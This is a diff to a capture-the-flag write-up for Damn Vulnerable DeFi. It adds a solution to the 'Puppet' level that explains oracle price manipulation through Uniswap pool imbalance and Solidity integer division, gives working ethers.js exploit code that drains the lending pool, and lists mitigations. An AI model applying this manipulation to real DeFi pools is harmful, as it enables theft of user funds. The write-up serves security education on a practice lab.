@@ -248,13 +248,13 @@ If you look closer on how the level contracts are deployed, you will see that bo
 - Avoid having a flashLoanable governance token...
 
 **Once you upload a photo, it will be always on the internet!**
-
+  ⠀
+  ⠀
 
 ## 7) Compromised
 
 ### Catch - Hints
 First go to the Damn Vulnerable DeFi website and enter this challenge page. You will see a response of an API. Try to do something with that...
-
 
 ### Solution
 Essentially, we need somehow to change the NFT price by manipulating the oracle. What we need to do is quite straightforward once we figure out what's encoded API response data. If we look closer, we see that there are two lines of information. Supposing that each line is a single response, we have:
@@ -388,3 +388,77 @@ This level leaves a bonus track that can be done as an easter egg! It does not c
 - Knowing how and what information is available to be queried from our server also helps.
 
 **The contracts are not always the weak point!**
+  ⠀
+  ⠀
+
+## 8) Puppet
+
+### Catch - Hints
+By taking into account the concept of offer and demand as well as knowing how does Solidity manages "decimal" numbers, this level is solved.
+
+### Solution
+This level relies on the ```_computeOraclePrice()``` function in order to perform the estimation of the collateral needed to request a certain amount of tokens. If you are coming from languages such as Python or Javascript you won't see anything odd in here. But in Solidity, things work quite different in terms of numbers. 
+
+The mentioned function performs a division of two terms (both having 18 *decimals*). To illustrate this, we may follow this example:
+⠀
+⠀
+
+| Python | 0.15  | 0.99 | 1 | 250 |
+| :---:   | :-: | :-: | :-: | :-: |
+| Solidity | 15 | 99 | 100 | 25,000 |
+
+
+In the recent example we see that in order to express decimals on Solidity, we must express them as integers with a certain *sensibility*. And afterwards when we want to perform an operation with the real number, we need to know the amount of decimal positions that the number has in order to add or remove them.
+
+So, what happens if we perform a division like this one ```2/10```? The result won't be ```0.2``` as expected. It will be shown as ```0``` because no decimal positions are natively defined on Solidity!
+
+Although this level uses a ```0.8.0``` compiler that comes with built-in over and underflow checks, this vulnerability exists because the scenario explained before can happen without throwing an over or underflow error! What we need to do is imbalance the division by making the denominator slightly bigger than the numerator and poof. That expression will go down drastically!
+
+To do so, we can use the Uniswap DEX instance of this level to swap the DVT tokens for a small amount of ether. The swaps are also known as AMM (automated market makers). Short story, they perform realtime math and finance calculations to estimate the equilibrium price of a certain swap based on the current demand and offer of the token as well as the current *ratio*. In here, the current balance says that the price is ```1 DVT = 1 ETH``` because there are 10 of each. But... what happens if we dump the price by offering ```1000 DVT = 1 wei``` ?(whoa, what an offer...) Exactly, there will be a new price! But more importantly, there will be a big imbalance on the Uniswap pool for the pair ```ETH / DVT``` causing the ```_computeOraclePrice()``` to return what we need!
+
+The steps to perform this exploit are the following:
+
+1) Approve the DEX and swap ```999 DVT``` for ```1 wei``` (*)
+2) Get the collateral required to extract the current total balance of DVT tokens from the Pool.
+3) Borrow all the tokens of the pool paying the collateral required.
+
+(*) You can try lowering this amount of given tokens to the swap in order to have as a result a collateral required of something near 25 ETH. But for simplicity, we used that number (because the level checks that the final DVT balance must be greater than the original pool balance).
+
+The code for this exploit may look something like this:
+
+        let smallAmount = ethers.utils.parseEther("999");
+
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            smallAmount
+        );
+        
+        let uniswapPairEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
+        let uniswapTokenBalance   = await this.token.balanceOf(this.uniswapExchange.address);
+        let computedPrice = uniswapPairEthBalance.mul(ethers.BigNumber.from(10).pow(18)).div(uniswapTokenBalance);
+        console.log(`Computed Oracle Price before swap: ${ethers.utils.formatEther(computedPrice)}`);
+
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            smallAmount,                                                // tokens sold
+            1,                                                          // min_eth_in_wei
+            (await ethers.provider.getBlock('latest')).timestamp * 3    // deadline
+        );
+
+        uniswapPairEthBalance = await ethers.provider.getBalance(this.uniswapExchange.address);
+        uniswapTokenBalance   = await this.token.balanceOf(this.uniswapExchange.address);
+        computedPrice = uniswapPairEthBalance.mul(ethers.BigNumber.from(10).pow(18)).div(uniswapTokenBalance);
+        console.log(`Computed Oracle Price after swap:  ${ethers.utils.formatEther(computedPrice)}`);
+        
+        let collateralRequired =  await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(`Collateral required to withdraw all funds: ${ethers.utils.formatEther(collateralRequired)}`);
+        
+        let lendingPoolBalance = await this.token.balanceOf(this.lendingPool.address);
+        await this.lendingPool.connect(attacker).borrow(lendingPoolBalance, {value: collateralRequired});
+        console.log(" ");
+
+### Learnings - Mitigations
+- When performing divisions, we need to evaluate if the denominator can be in a scenario greater than the numerator and how it may impact the contract logic.
+- If we need to perform a division to use that ratio as a proportional for other number, it is advisable to perform all the multiplications first and then calculate the division in the end. On this level this could be done by combining the functions ```calculateDepositRequired``` and ```_computeOraclePrice``` in a single operation that first multiplies the ```amount``` with ```uniswapPair.balance``` performing the division by ```token.balanceOf(uniswapPair)``` in the end.
+- Doing the former suggestion does not stops anyone from going to the DEX and perform swaps in order to manipulate the price. It is a matter of liquidity also! If the token has more liquidity, it is harder to manipulate it.
+
+**Remember when on school we where taught to do "boxed divisions"? Solidity also hates the remainder!**
